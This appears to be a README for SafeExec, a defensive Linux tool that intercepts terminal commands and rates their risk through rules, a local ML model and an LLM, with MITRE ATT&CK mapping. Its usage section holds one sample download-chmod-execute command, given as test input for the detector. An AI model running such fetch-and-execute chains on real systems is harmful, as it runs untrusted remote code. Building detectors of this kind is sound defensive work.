# SafeExec: AI-Based System Intent Engine

SafeExec is an intelligent safety layer for Linux command execution. It evaluates the intent and potential risk of a terminal command before it reaches the operating system.

The system uses a multi-tier pipeline:

**Deterministic Rules → Local ML → LLM Analysis**

The goal is to keep normal developer workflows fast while providing deeper analysis for commands that are ambiguous or potentially dangerous.

## Features

### Low-Latency Command Evaluation

SafeExec avoids sending every command to an ML model or LLM. Straightforward commands are handled by the deterministic rules engine, while repeated commands can be served from an SQLite cache.

### Command Canonicalization

Commands are parsed and converted into a normalized representation before further analysis. Paths, arguments, flags, and command structure can be abstracted so that similar commands can be evaluated consistently.

### Multi-Tier Detection

- **Tier 0:** Deterministic rules for known-safe and known-risky command patterns.
- **Tier 1:** Local machine-learning scoring for commands that require additional analysis.
- **Tier 2:** LLM-based analysis for commands that remain ambiguous after the local checks.

### Risk-Aware Decisions

Depending on the analysis result, SafeExec can:

- Allow the command
- Warn the user and request confirmation
- Block the command
- Explain the potential impact
- Suggest a safer alternative

### MITRE ATT&CK Mapping

Suspicious commands can be associated with relevant MITRE ATT&CK techniques to provide additional security context.

### Blast-Radius Analysis

The system considers the potential impact of a command, including:

- Filesystem access
- Process execution
- Network communication
- Privilege requirements
- Persistence mechanisms
- Potential data exposure
- Scope of affected resources

### Fail-Open Communication

The hook communicates with the background daemon using TCP with timeouts. If the daemon becomes unavailable, the hook does not remain blocked indefinitely.

## Architecture

![System Architecture](assets/architecture.jpg)

```text
                    Terminal Command
                           |
                           v
                     SafeExec Hook
                           |
                           v
                Command Canonicalization
                           |
                           v
                    Tier 0 Rules
                     /         \
                  Match       No Match
                    |             |
                    v             v
                  Allow       SQLite Cache
                                  |
                              Cache Miss
                                  |
                                  v
                         Tier 1 Local ML
                           /          \
                       Low Risk     Uncertain
                           |             |
                           v             v
                         Allow       Tier 2 LLM
                                         |
                                         v
                                Threat Classification
                                  /               \
                              Benign             Malicious
                                |                   |
                                v                   v
                              Allow        MITRE ATT&CK Mapping
                                                    |
                                                    v
                                               Blast Radius
                                                    |
                                                    v
                                                  Block
```

## Detection Pipeline

![Detection Pipeline](assets/detection-pipeline.jpg)

The detection process is intentionally hierarchical.

A command first passes through deterministic checks. If the rules cannot confidently classify it, the command moves to the local ML scorer. Only commands that remain uncertain are sent to the LLM layer.

This reduces unnecessary inference and keeps routine terminal operations local.

## Execution Flow

![Execution Flow](assets/execution-flow.jpg)

```text
Command typed
      |
      v
SafeExec Hook
      |
      v
Safety Daemon
      |
      +--> Canonicalization
      |
      +--> Tier 0 Rules
      |
      +--> SQLite Cache
      |
      +--> Tier 1 ML
      |
      +--> Tier 2 LLM
      |
      v
Risk Verdict
      |
   +--+--------+
   |           |
 Allow      Warn/Block
```

## Dataset and Machine Learning

### Dataset Sources

The Tier 1 model uses a combination of benign command examples and security-oriented command examples.

The repository contains the processed training dataset as:

```text
real_training_data.csv
```

The dataset was prepared from sources including:

- **NL2Bash** for natural-language-to-shell command examples and normal command patterns.
- **GTFOBins** for examples of Linux binaries and command patterns that can be abused for execution, privilege escalation, file access, and other security-sensitive behavior.
- Linux administration and shell-command examples for common developer and system workflows.
- Synthetic variations used to increase coverage of suspicious command structures and command combinations.

The source material is transformed into numerical features before being used for model training.

### Training Features

The current Tier 1 model uses features such as:

```text
NumPipes
NumFlags
IsSudo
ObfuscationChars
```

These features capture structural properties of the command rather than relying only on exact command strings.

For example:

```text
sudo chmod 777 file
```

contains indicators related to privilege usage and permission modification, while a command containing several pipes may represent a more complex execution chain.

### Model

The training script uses:

- Python
- Pandas
- Scikit-learn
- XGBoost
- m2cgen

The XGBoost classifier is trained using the prepared CSV dataset and then converted into Go code using m2cgen.

The generated model is stored in:

```text
pkg/tier1/model.go
```

Because the trained model is compiled into the Go project, users cloning the repository **do not need to run `train_model.py` to use SafeExec**, provided the generated `pkg/tier1/model.go` is already included.

The training script is useful when the dataset or model configuration needs to be changed and a new model needs to be generated.

### Training Flow

```text
Training Dataset
      |
      v
Feature Extraction
      |
      v
Train/Test Split
      |
      v
XGBoost Training
      |
      v
Model Evaluation
      |
      v
m2cgen
      |
      v
Generated Go Model
      |
      v
pkg/tier1/model.go
```

## Command Canonicalization

Attackers can modify the syntax of commands to bypass simple string-based detection.

SafeExec therefore performs command parsing and canonicalization before deeper analysis.

The purpose is to preserve important structural information while reducing irrelevant variations such as:

- Different argument values
- File paths
- Flags
- Quoting differences
- Command chaining
- Pipes
- Redirections

For example:

```text
mkdir project1
mkdir project2
mkdir test_folder
```

can be treated as instances of the same general command pattern:

```text
mkdir <ARG>
```

This allows the detection layers to focus on command behavior rather than memorizing individual strings.

## Tier 0: Deterministic Rules

Tier 0 performs lightweight rule-based analysis.

Examples of patterns that can be checked include:

- Destructive filesystem operations
- Suspicious download-and-execute chains
- Privilege changes
- Shell interpreter execution
- Dangerous permission modifications
- Suspicious command combinations

Commands confidently classified by Tier 0 do not need ML or LLM inference.

## Tier 1: Local ML

Commands that are not confidently classified by Tier 0 are evaluated using the local ML model.

The model produces a risk probability based on extracted command features.

Conceptually:

```text
Command
   |
   v
Feature Extraction
   |
   v
[NumPipes, NumFlags, IsSudo, ObfuscationChars]
   |
   v
XGBoost Model
   |
   v
Risk Probability
```

The local model provides a lightweight second layer of analysis without requiring an external API call.

## Tier 2: LLM Analysis

Commands that remain ambiguous can be passed to the LLM layer.

The LLM is intended for contextual analysis where deterministic rules and numerical features are not sufficient.

The response can provide:

- Threat classification
- Reason for the classification
- Potential impact
- MITRE ATT&CK technique
- Blast radius
- Recommended action
- Safer alternative

The LLM is therefore used as a deeper reasoning layer rather than the first line of command detection.

## MITRE ATT&CK Telemetry

Suspicious command behavior can be mapped to relevant MITRE ATT&CK techniques.

For example, a command that downloads a remote file and executes it may involve techniques related to:

```text
T1059 - Command and Scripting Interpreter
T1105 - Ingress Tool Transfer
```

The exact technique depends on the behavior identified during analysis.

This information can be used for security monitoring and incident-response workflows.

## Blast Radius

A malicious command can have different levels of impact.

SafeExec therefore evaluates factors such as:

```text
Filesystem
   |
Process Execution
   |
Network Access
   |
Privileges
   |
Persistence
   |
Data Exposure
```

This allows the system to provide more useful context than a simple malicious/benign label.

## Tech Stack

### Core

- Go
- Linux
- Bash
- TCP sockets
- SQLite

### Machine Learning

- Python
- Pandas
- Scikit-learn
- XGBoost
- m2cgen

### AI / LLM

- Groq API
- LLM-based command reasoning

### Command Analysis

- Shell command parsing
- AST-based command representation
- Command canonicalization
- Feature extraction

### Security

- MITRE ATT&CK
- Rule-based threat detection
- Local ML scoring
- Risk classification
- Blast-radius analysis

### Development Tools

- Git
- Go toolchain
- Python virtual environment
- Linux shell

## Installation

### Clone the Repository

```bash
git clone https://github.com/yourusername/safeexec.git
cd safeexec
```

### Configure the API Key

Tier 2 uses Groq for LLM inference.

Create a `.env` file in the project root:

```env
API_KEY=gsk_your_api_key_here
```

Keep `.env` in `.gitignore` so API credentials are not committed to the repository.

### Build the Binaries

SafeExec currently targets Linux.

```bash
go build -o daemon ./cmd/daemon
go build -o hook ./cmd/hook
```

This creates:

```text
daemon
hook
```

The daemon runs the analysis service, while the hook is responsible for sending terminal commands to the daemon.

## Usage

### Start the Daemon

```bash
./daemon
```

### Test the Hook

Test a normal command:

```bash
./hook "mkdir test_folder"
```

A command such as this should be handled by the lower layers of the detection pipeline.

For testing deeper analysis, a command containing multiple security-sensitive operations can be passed to the hook:

```bash
./hook "wget http://example.com/file -O /tmp/x; chmod +x /tmp/x; /tmp/x"
```

Use controlled test inputs when evaluating command-blocking behavior.

## Shell Integration

SafeExec can be integrated with Bash so commands are automatically evaluated.

Add the following to `~/.bashrc`:

```bash
preexec_invoke_safeexec() {
    /path/to/safeexec/hook "$BASH_COMMAND"
    if [ $? -ne 0 ]; then
        return 1
    fi
}

trap 'preexec_invoke_safeexec' DEBUG
```

Replace the path with the location of the compiled SafeExec hook.

Reload the shell:

```bash
source ~/.bashrc
```

## Project Structure

```text
safeexec/
│
├── cmd/
│   ├── daemon/
│   │   └── main.go
│   │
│   └── hook/
│       └── main.go
│
├── pkg/
│   ├── cache/
│   │   └── sqlite.go
│   │
│   ├── ipc/
│   │   └── server.go
│   │
│   ├── parser/
│   │   ├── parser.go
│   │   └── parser_test.go
│   │
│   ├── tier0/
│   │   └── engine.go
│   │
│   ├── tier1/
│   │   ├── features.go
│   │   ├── model.go
│   │   └── scorer.go
│   │
│   └── tier2/
│       └── llm.go
│
├── real_training_data.csv
├── train_model.py
├── go.mod
├── go.sum
├── .env
└── README.md
```

## Security Considerations

SafeExec is a security-assistance layer and should not replace operating-system security controls.

- Do not treat LLM output as an infallible security boundary.
- Keep API credentials outside source control.
- Run the daemon with appropriate privileges.
- Validate communication between the hook and daemon.
- Keep deterministic security rules independent of the LLM layer.
- Test against obfuscated and adversarial command inputs.
- Avoid executing untrusted commands during testing.

## Current Scope

SafeExec currently focuses on Linux terminal command interception and analysis.

The current implementation covers:

- Command interception
- Command parsing and canonicalization
- Deterministic threat detection
- SQLite caching
- Local ML scoring
- LLM-assisted analysis
- MITRE ATT&CK mapping
- Blast-radius estimation
- Daemon-based command evaluation

The architecture can later be extended toward broader endpoint telemetry, centralized security policies, security dashboards, and SOC integrations.
